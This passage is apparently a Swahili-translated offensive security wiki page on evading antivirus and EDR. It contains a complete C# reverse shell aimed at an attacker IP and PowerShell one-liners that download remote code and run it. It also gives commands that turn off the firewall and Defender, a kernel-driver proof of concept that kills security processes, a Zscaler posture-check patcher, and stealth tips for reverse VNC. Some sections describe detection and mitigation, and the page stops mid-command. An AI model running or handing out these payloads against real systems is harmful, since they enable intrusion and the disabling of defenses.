Kila mazingira unayokabiliana nayo yatakuwa na uwezo na udhaifu wake.

Ninakuhimiza sana uangalie mazungumzo haya kutoka kwa [@ATTL4S](https://twitter.com/DaniLJ94), ili upate msingi wa kuelewa mbinu za juu zaidi za ukwepaji.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Haya pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia ni sehemu zipi Defender huzitambua kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **huondoa sehemu za binary** hadi **igundue ni sehemu ipi Defender** inayoichukulia kuwa hasidi, kisha inakutenganishia sehemu hiyo.\
Tool nyingine inayofanya **jambo hilohilo ni** [**avred**](https://github.com/dobin/avred), yenye huduma ya wazi ya wavuti katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Seva ya Telnet**

Hadi Windows10, Windows zote zilikuja na **seva ya Telnet** ambayo ungeweza kusakinisha (kama administrator) kwa kufanya:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Ifanye **ianze** mfumo unapowashwa na **uiendeshe** sasa:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badilisha port ya telnet (kwa siri) na uzime firewall:**

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Ipakue kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji downloads za bin, si setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

- Washa chaguo la _Disable TrayIcon_
- Weka nenosiri katika _VNC Password_
- Weka nenosiri katika _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili _**UltraVNC.ini**_ lililoundwa **sasa hivi** ndani ya **victim**

#### **Muunganisho wa reverse**

**Attacker** anapaswa **kutekeleza ndani ya** host yake binary `vncviewer.exe -listen 5900` ili awe **tayari** kupokea **muunganisho wa VNC** wa reverse. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na uendeshe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha stealth, hupaswi kufanya mambo machache

- Usianzishe `winvnc` ikiwa tayari inaendeshwa, la sivyo utaanzisha [popup](https://i.imgur.com/1SROTTl.png). angalia ikiwa inaendeshwa kwa kutumia `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` katika directory hiyo hiyo, la sivyo [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) litafunguka
- Usiendeshe `winvnc -h` kwa ajili ya msaada, la sivyo utaanzisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Ipakue kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anzisha lister** kwa kutumia `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa kutumia:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender ya sasa itasitisha mchakato haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Ikompile kwa kutumia:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie pamoja na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuzima AV/EDR Kutoka Kernel Space

Storm-2603 ilitumia kifaa kidogo cha console kinachojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kuweka ransomware. Zana hii huja na **driver yake yenye udhaifu lakini *iliyosainiwa*** na huitumia vibaya kutekeleza shughuli za kernel zenye mapendeleo ambayo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu ya kukumbuka
1. **Driver iliyosainiwa**: Faili inayowasilishwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni driver iliyosainiwa kihalali ya `AToolsKrnl64.sys` kutoka “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver hiyo ina saini halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa huduma**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **kernel service** na wa pili huianzisha ili `\\.\ServiceMouse` ipatikane kutoka user land.
3. **IOCTLs zinazotolewa na driver**
   | Msimbo wa IOCTL | Uwezo                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kukatisha mchakato wowote kwa PID (hutumika kusimamisha huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili lolote kwenye diski |
   | `0x990001D0` | Kupakua driver na kuondoa huduma |

   C proof-of-concept ndogo:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; code inayotekelezwa kwenye kernel inaweza kufungua michakato *iliyolindwa*, kuisitisha, au kuingilia objects za kernel bila kujali PPL/PP, ELAM au vipengele vingine vya hardening.

Ugunduzi / Kupunguza hatari
•  Washa orodha ya Microsoft ya kuzuia madereva hatari (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.
•  Fuatilia uundaji wa huduma mpya za *kernel* na utoe tahadhari dereva anapopakiwa kutoka kwenye directory inayoweza kuandikiwa na kila mtu au hayupo kwenye orodha ya ruhusa.
•  Chunguza handles za user-mode kwa device objects maalum zinazofuatwa na miito ya kutiliwa shaka ya `DeviceIoControl`.

### Kukwepa Ukaguzi wa Hali ya Zscaler Client Connector kwa Kurekebisha Binary Zilizo Kwenye Diski

Zscaler’s **Client Connector** hutekeleza sheria za hali ya kifaa ndani ya kifaa na hutegemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguo mbili dhaifu za usanifu huwezesha kukwepa ukaguzi kabisa:

1. Tathmini ya hali ya kifaa hufanyika **upande wa mteja pekee** (boolean hutumwa kwa server).
2. RPC endpoints za ndani huthibitisha tu kwamba executable inayounganisha **imesainiwa na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kurekebisha binaries nne zilizosainiwa kwenye diski**, mifumo yote miwili inaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila wakati, hivyo kila ukaguzi hupita |
| `ZSAService.exe` | Wito usio wa moja kwa moja wa `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata usiosainiwa) unaweza kuunganishwa na RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa uadilifu wa tunnel | Huzimwa mapema |

Sehemu ndogo ya patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili asili na kuwasha upya stack ya huduma:

* Ukaguzi **wote** wa posture huonyesha hali ya **green/compliant**.
* Binary zisizosainiwa au zilizorekebishwa zinaweza kufungua endpoints za named-pipe RPC (kwa mfano, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyodukuliwa hupata ufikiaji usio na vizuizi kwenye mtandao wa ndani unaofafanuliwa na policies za Zscaler.

Uchunguzi huu wa kisa unaonyesha jinsi maamuzi ya uaminifu ya upande wa client pekee na ukaguzi rahisi wa saini vinavyoweza kushindwa kwa marekebisho machache ya byte.

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Driver ya **Boot-Time Removal** ya Defender ni mfano mzuri wa kulinganisha na BYOVD ya kawaida. `BTR.sys` ni component halali ya remediation iliyosainiwa na Microsoft, isiyo na bug ya memory-corruption wala interface ya IOCTL; baada ya kupata ufikiaji wa msimamizi na `SeLoadDriverPrivilege`, operator anaweza badala yake kuunda transaction yake ya faragha ya remediation na kupata operesheni za faili/registry za Ring-0 zilizokusudiwa. Hii ni primitive ya **kudhoofisha AV/EDR baada ya compromise, si ufikiaji wa awali au kupandisha privilege**, na driver inaweza kutolewa kutoka kwenye resource ya `BOOTTIMETOOL` ya `MpEngine.dll` ya target yenyewe badala ya kuleta driver ya mtu mwingine inayotia shaka.<sup>[[36]](#references)</sup>

### Kuweka driver ya matumizi moja tayari

Kwa kawaida Defender huhifadhi resource kama faili yenye jina nasibu la `[a-z]{8}.sys` na kusajili kernel service yenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya service, hufungua NTFS ADS iliyorejelewa, husimbua na kuthibitisha orodha ya vitendo, huandika feedback, kisha hurejesha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya kutekeleza kwa mafanikio ili driver ijiondoe badala ya kubaki ikifanya kazi. Service iliyoghushiwa huwa na thamani bainifu zifuatazo.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Mtiririko wa `:changelist` una blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia tena key ileile isiyobadilika ya baiti 256, kwa hiyo usimbaji fiche si mpaka wa uidhinishaji. Plaintext halali ina header ya kimataifa ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC ya header na kitambulisho cha transaction kinachotokana na payload), ikifuatiwa na njia ya feedback ya UTF-16 iliyoishia kwa null na idadi yoyote ya items. Kila item ina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data mahususi kwa action inayoishia kwa **baiti nne za NUL haswa**. Kila eneo la header/data hukaguliwa kivyake kwa CRC-32 yenye polynomial `0xEDB88320`, hali ya mwanzo `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Action ID zinazokubaliwa hufichua primitives hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya item | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, ikiwemo faili iliyofungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye njia iliyolindwa iliyochaguliwa na mshambuliaji; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa key ya registry pamoja na yaliyomo ndani yake kwa kujirudia |
| 5 | `[Flags][key path + "\\" + value]` | Futa value ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha value ya registry na uunde njia za key ambazo hazipo |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye data inayotumwa ni **backslash mbili mfululizo**; njia iliyopangwa kwa kawaida haitatenganishwa kwa usahihi. Faili ya feedback kwa kiasi kikubwa huakisi ombi, lakini baiti nne za kwanza za data ya kila item huwa `NTSTATUS` ya matokeo yake. Kwa actions 1 na 2, ambazo hazina sehemu ya flags mwanzoni, BTR huhamisha njia hadi kwenye baiti nne za mwisho zilizohifadhiwa ili kutoa nafasi ya status hiyo.<sup>[[36]](#references)</sup>

### Mfuatano wa kazi wa `BTR_CLI` na kipindi cha mapema cha uanzishaji

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: kutoa `BTR.sys` kutoka Defender ya ndani, kuunda `<random>.sys:changelist` na stream ya feedback, kuserializa/kukokotoa checksum/kusimba actions zilizounganishwa, kuunda key ya registry ya service moja kwa moja, kisha kuita `NtLoadDriver` kwa `-trigger now` au kuiacha kama driver ya system-start kwa `-trigger boot`. Kuweka maandalizi moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW` na hivyo **hakusababishi** Event ID 7045 ya usakinishaji wa service. Vitu vilivyoachwa na trigger ya boot vinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haiwezi kutumika kwa sababu BTR hufanya I/O ya faili kutoka `DriverEntry` kabla stack ya hifadhi na kiungo cha `SystemRoot` havijawa tayari. `Start=1` pamoja na kundi la kipaumbele cha juu la `Boot Bus Extender` badala yake hutekelezwa katika Phase 1: NTFS inaweza kutumika, lakini viendeshi vingi vya usalama vya system-start na huduma za EDR za user-mode bado hazijaanzishwa. Vichujio vya boot-start kama `WdFilter` huenda tayari vimepakiwa, lakini BTR inaweza kuondoa binary zake au usanidi wa huduma kabla ya kuwasha tena, na inaweza kufuta executables za huduma kabla SCM haijazizindua. ELAM haizibi pengo hili kwa sababu BTR huendeshwa baada ya tathmini ya boot-start na ina sahihi halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi hutekelezwa katika muamala mmoja. PoC huweka Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa moja kwa moja: BTR huunda logi hii, kisha hutekeleza ombi lake la kufuta na kuiondoa kabla ya kujiondoa. Hili hupunguza ushahidi, huku kuweka feedback ndani ya `<random>.sys:<random>.dat` kunaruhusu kuondoa driver na streams zote mbili pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Uhusishaji wa viashiria vya juu

Sheria zinazotegemea sahihi pekee na orodha ya Microsoft ya madereva hatari yaliyozuiwa hazishughulikii matumizi mabaya ya utendaji uliokusudiwa wa BTR. Pendelea uhusishaji huu wa kitabia, huku ukitofautisha lineage halali ya Defender na launcher isiyo husika.<sup>[[36]](#references)</sup>

- **Sysmon 15:** uundaji wa `.sys:changelist` ni wa kawaida katika uwekaji wa BTR. ADS ya `.dat` iliyoambatanishwa na `.sys` hiyo hiyo inatia shaka zaidi, kwa sababu Defender halali kwa kawaida huweka feedback chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** husisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` wenye `Args=...:changelist` na `Group=Boot Bus Extender` bila tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** husisha kupakiwa kwa driver ya BTR inayojulikana kutoka kwenye lineage isiyo ya Defender na kufuatiwa na kufutwa kwa faili kunakohusishwa na `System`/PID 4, hasa kwa binary za usalama.
- **Sysmon 11 -> 23:** toa tahadhari kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` na `System`/PID 4.
- Zuia na kagua ugawaji/uwezeshaji wa `SeLoadDriverPrivilege`; sahihi ya Microsoft pekee haitoshi kuthibitisha uaminifu wakati driver ya zana ya usalama inawekwa na `cmd.exe`, PowerShell au mchakato usiojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuharibu AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza ngazi ya signer/level ili michakato iliyolindwa yenye kiwango sawa au cha juu pekee iweze kuharibu mingine. Kwa upande wa mashambulizi, ukiweza kuzindua kihalali binary iliyowezeshwa PPL na kudhibiti hoja zake, unaweza kubadilisha utendaji usio na madhara (kwa mfano, logging) kuwa primitive ya uandishi yenye vikwazo na inayotumia PPL dhidi ya saraka zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL zozote zilizopakiwa) lazima zisainiwe kwa EKU inayoweza kutumia PPL.
- Mchakato lazima uundwe kwa CreateProcess kwa kutumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Lazima iombwe protection level inayolingana na signer wa binary (kwa mfano, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers za anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers za Windows). Viwango visivyo sahihi vitasababisha uundaji kushindwa.

Tazama pia utangulizi mpana zaidi wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za launcher
- Kisaidizi cha open-source: CreateProcessAsPPL (huchagua protection level na kupeleka hoja kwa EXE lengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitive ya LOLBIN: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` hujizindua yenyewe na hupokea kigezo cha kuandika faili ya kumbukumbu kwenye njia iliyobainishwa na mtumiaji.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa ulinzi wa PPL.
- ClipUp haiwezi kuchanganua njia zilizo na nafasi; tumia njia fupi za 8.3 kuelekeza kwenye maeneo ambayo kwa kawaida yamelindwa.

Vifaa saidizi vya njia fupi za 8.3
- Orodhesha majina mafupi: `dir /x` katika kila saraka mama.
- Pata njia fupi kwenye cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mlolongo wa matumizi mabaya (muhtasari)
1) Zindua LOLBIN yenye uwezo wa PPL (ClipUp) kwa kutumia `CREATE_PROTECTED_PROCESS` kupitia kizindua (kwa mfano, CreateProcessAsPPL).
2) Pitisha kigezo cha njia ya kumbukumbu ya ClipUp ili kulazimisha uundaji wa faili katika saraka ya AV iliyolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 ikihitajika.
3) Ikiwa binary lengwa kwa kawaida hufunguliwa/kufungwa na AV inapofanya kazi (kwa mfano, MsMpEng.exe), panga uandishi wakati wa kuwasha kompyuta kabla ya AV kuanza kwa kusakinisha huduma ya kuanza kiotomatiki ambayo huendeshwa mapema kwa uhakika. Thibitisha mpangilio wa kuwasha kwa kutumia Process Monitor (kurekodi kuwasha).
4) Baada ya kuwasha upya, uandishi unaolindwa na PPL hufanyika kabla AV haijafunga binaries zake, na kuharibu faili lengwa na kuzuia kuanza kwake.

Mfano wa amri (njia zimefichwa/kufupishwa kwa usalama):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Maelezo na vikwazo
- Huwezi kudhibiti maudhui ambayo ClipUp huandika, ila mahali yanapoandikwa; primitive hii inafaa kwa kuharibu data badala ya kuingiza maudhui mahususi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service na dirisha la kuwasha upya.
- Muda ni muhimu sana: target haipaswi kuwa wazi; utekelezaji wakati wa kuwasha huepusha file locks.

Ugunduzi
- Uundaji wa process ya `ClipUp.exe` yenye arguments zisizo za kawaida, hasa ikiwa imeanzishwa na launchers zisizo za kawaida, wakati wa kuwasha au karibu na wakati huo.
- Services mpya zilizowekwa kuwaka kiotomatiki na kuanzisha binaries zinazotiliwa shaka kabla ya Defender/AV kila mara. Chunguza uundaji/urekebishaji wa service kabla ya hitilafu za kuwaka kwa Defender.
- Ufuatiliaji wa uadilifu wa faili za Defender/mafaili ya Platform; uundaji/urekebishaji usiotarajiwa wa faili na processes zilizo na protected-process flags.
- Telemetry ya ETW/EDR: tafuta processes zilizoundwa kwa `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Hatua za kupunguza hatari
- WDAC/Code Integrity: punguza binaries zilizotiwa saini zinazoweza kuendeshwa kama PPL na parents zinazoruhusiwa; zuia uanzishaji wa ClipUp nje ya mazingira halali.
- Usimamizi wa service: zuia uundaji/urekebishaji wa services zinazojiwasha kiotomatiki na fuatilia mabadiliko ya mpangilio wa kuwaka.
- Hakikisha ulinzi wa Defender dhidi ya tampering na ulinzi wa early-launch umewashwa; chunguza hitilafu za kuwaka zinazoashiria uharibifu wa binary.
- Fikiria kuzima uundaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa inaendana na mazingira yako (jaribu kwa kina).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform itakayotumia kwa kuorodhesha folda ndogo zilizo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua folda ndogo yenye mfuatano wa toleo ulio juu zaidi kwa mpangilio wa leksikografiki (kwa mfano, `4.18.25070.5-0`), kisha huwasha processes za service ya Defender kutoka humo (na kusasisha njia za service/registry ipasavyo). Uteuzi huu huamini maingizo ya directory, yakiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye njia inayoweza kuandikwa na mshambuliaji na kufanikisha DLL sideloading au kuvuruga service.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika ili kuunda directories/symlinks chini ya folda ya Platform)
- Uwezo wa kuwasha upya au kusababisha uteuzi upya wa platform ya Defender (service huwashwa upya wakati wa kuwasha)
- Zana zilizojengewa ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandishi kwenye folda zake yenyewe, lakini uteuzi wake wa platform huamini maingizo ya directory na kuchagua toleo lililo juu zaidi kwa mpangilio wa leksikografiki bila kuthibitisha kuwa lengwa linaelekeza kwenye njia iliyolindwa/kuaminika.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikwa ya folda ya sasa ya platform, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
